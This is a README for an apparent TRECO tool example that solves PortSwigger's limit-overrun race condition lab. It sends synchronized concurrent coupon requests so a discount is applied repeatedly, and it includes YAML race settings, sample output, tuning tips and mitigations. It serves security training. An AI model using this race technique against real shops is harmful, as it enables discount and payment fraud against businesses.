# PortSwigger Lab: Limit Overrun Race Conditions

<p align="center">
  <img src="screenshot.png" alt="TRECO solving the PortSwigger Limit Overrun lab" width="100%">
</p>

> **Lab:** [Limit overrun race conditions](https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun)  
> **Difficulty:** Apprentice  
> **Objective:** Purchase the "Lightweight L33t Leather Jacket" using race condition exploitation

## Overview

This example demonstrates how TRECO can exploit a **TOCTOU (Time-of-Check to Time-of-Use)** vulnerability in a coupon redemption system. By sending multiple concurrent requests, we bypass the single-use validation and apply a 20% discount coupon multiple times.

### The Math

| Item | Value |
|------|-------|
| Jacket Price | $1,337.00 |
| Store Credit | $50.00 |
| Coupon Discount | 20% per application |
| Required Applications | ~7x to reach ≤$50 |

```
$1,337.00 × 0.8^7 = $28.05 ✓ (within $50 budget)
```

## Quick Start

```bash
# 1. Set your lab URL
export LAB_HOST="YOUR-LAB-ID.web-security-academy.net"

# 2. Run the attack
uv run treco attack.yaml
```

## Attack Flow

```
┌─────────────────────────────────────────────────────────────────┐
│  1. LOGIN                                                       │
│     GET /login → Extract CSRF + session                         │
│     POST /login → Authenticate as wiener:peter                  │
├─────────────────────────────────────────────────────────────────┤
│  2. SETUP CART                                                  │
│     POST /cart → Add Leather Jacket ($1,337.00)                 │
│     GET /cart → Verify total, extract CSRF                      │
├─────────────────────────────────────────────────────────────────┤
│  3. RACE ATTACK ⚡                                              │
│     ┌─────────────────────────────────────────────────────┐     │
│     │  20 threads synchronized at barrier                 │     │
│     │  All send POST /cart/coupon simultaneously          │     │
│     │  Multiple coupons applied before validation kicks in│     │
│     └─────────────────────────────────────────────────────┘     │
├─────────────────────────────────────────────────────────────────┤
│  4. VERIFY & CHECKOUT                                           │
│     GET /cart → Check new total                                 │
│     POST /cart/checkout → Complete purchase 🎉                  │
└─────────────────────────────────────────────────────────────────┘
```

## Race Condition Explained

```
Normal Flow (Protected):
┌─────────────────────────────────────────────────────────────────┐
│ Request 1: Check coupon → Not used → Mark used → Apply 20%     │
│ Request 2: Check coupon → Already used → REJECT ❌              │
└─────────────────────────────────────────────────────────────────┘

Race Condition (Vulnerable):
┌─────────────────────────────────────────────────────────────────┐
│ Thread 1: Check coupon → Not used ─┐                            │
│ Thread 2: Check coupon → Not used ─┤  All pass simultaneously!  │
│ Thread 3: Check coupon → Not used ─┤                            │
│ ...                                │                            │
│ Thread N: Check coupon → Not used ─┘                            │
│                                    ↓                            │
│ All threads: Mark used → Apply 20% (N times!)                   │
└─────────────────────────────────────────────────────────────────┘
```

## Configuration Highlights

```yaml
race:
  threads: 20                      # Number of concurrent requests
  sync_mechanism: barrier          # All threads release simultaneously  
  connection_strategy: preconnect  # Establish connections before race
  thread_propagation: single       # Only one thread continues after race
```

### Connection Strategies

| Strategy | Description | Race Window |
|----------|-------------|-------------|
| `preconnect` | Individual HTTP/1.1 connections per thread | ~50-100ms |
| `multiplexed` | Single HTTP/2 connection, all streams | ~1-10ms |

### Sync Mechanisms

| Mechanism | Behavior |
|-----------|----------|
| `barrier` | All threads wait until everyone is ready, then release together |
| `countdown_latch` | Threads count down, release when counter hits zero |

## Expected Output

```
╔══════════════════════════════════════════════════════════════════════════╗
║  🦎 PortSwigger - Limit Overrun Race Condition                           ║
╠══════════════════════════════════════════════════════════════════════════╣
║  🎯 Target: 0aab0834...web-security-academy.net                          ║
║  🎟️  Coupon: PROMO20                                                     ║
╚══════════════════════════════════════════════════════════════════════════╝

🔐 Logged in as 'wiener'
🛒 Added product #1 to cart
💰 Total: $1337.0 | 💳 Credit: $38.75

┌──────────────────────────────────────────────────────────────┐
│  ⚡ RACE ATTACK                                              │
├──────────────────────────────────────────────────────────────┤
│  🔗 Endpoint:  POST /cart/coupon                             │
│  🧵 Threads:   20                                            │
│  🔧 Strategy:  preconnect + barrier                          │
└──────────────────────────────────────────────────────────────┘

🟢 Coupon applied    🟢 Coupon applied    🟢 Coupon applied
🟢 Coupon applied    🔴 Already applied   🟢 Coupon applied
🟢 Coupon applied    🔴 Already applied   🔴 Already applied
...

┌──────────────────────────────────────────────────────────────┐
│  📊 RESULTS                                                  │
├──────────────────────────────────────────────────────────────┤
│  💵 Before: $1337.00                                         │
│  💵 After:  $19.25                                           │
│  💳 Credit: $38.75                                           │
├──────────────────────────────────────────────────────────────┤
│  🎉 VULNERABLE - Total is within store credit!               │
└──────────────────────────────────────────────────────────────┘

╔══════════════════════════════════════════════════════════════╗
║  🏆 LAB SOLVED!                                              ║
╚══════════════════════════════════════════════════════════════╝
```

## Troubleshooting

### Only 1-2 coupons applied

Increase thread count or try the multiplexed strategy:

```yaml
race:
  threads: 30
  connection_strategy: multiplexed  # Tighter race window
```

### Connection errors

Disable certificate verification:

```yaml
config:
  tls:
    verify_cert: false
```

### Lab URL expired

PortSwigger lab URLs expire after ~15 minutes. Start a new lab and update `LAB_HOST`.

## Files

| File | Description |
|------|-------------|
| `attack.yaml` | TRECO configuration for the attack |
| `README.md` | This documentation |
| `screenshot.png` | Example successful run |

## Security Implications

This vulnerability demonstrates critical security issues:

- **Business Logic Bypass** — Single-use limitations circumvented
- **Financial Impact** — Items purchased for unintended prices  
- **Scalability** — More threads = more discount applications
- **Detection Difficulty** — May appear as legitimate traffic

## Mitigation

1. **Database Transactions** — Wrap check-and-update atomically
2. **Pessimistic Locking** — Lock coupon record before validation
3. **Idempotency Keys** — Unique request identifiers
4. **Rate Limiting** — Limit coupon attempts per session

## Related Labs

- [Multi-endpoint Race Conditions](https://portswigger.net/web-security/race-conditions/lab-race-conditions-multi-endpoint)
- [Bypassing Rate Limits via Race Conditions](https://portswigger.net/web-security/race-conditions/lab-race-conditions-bypassing-rate-limits)
- [Partial Construction Race Conditions](https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction)